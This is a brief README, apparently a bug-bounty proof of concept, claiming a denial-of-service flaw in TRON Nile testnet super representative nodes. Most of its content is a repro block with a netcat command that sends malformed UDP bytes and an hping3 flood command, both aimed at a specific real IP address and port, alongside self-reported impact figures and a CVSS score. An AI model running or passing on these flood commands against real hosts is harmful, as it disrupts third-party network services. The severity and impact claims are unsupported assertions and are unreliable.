# Mr Tron Recon 🚀

TRON Nile SR DoS PoC - HackerOne #3676543

**Live Impact:**
- 3 SRs accept malformed: `3.137.0.94:18888`
- 60s flood: 24,510 packets → 100% loss
- Source: `PeerConnection.BAD_BLOCK:170`

**Repro:**
```bash
printf '\x12\x03BAD\x10\x01' | nc -u 3.137.0.94 18888  # ACCEPTED
sudo hping3 -2 --flood -p 18888 --data 120342030244410101 3.137.0.94
```

CVSS 9.6 |  | [Video](hping3-2026-04-15_22.16.29.mp4)
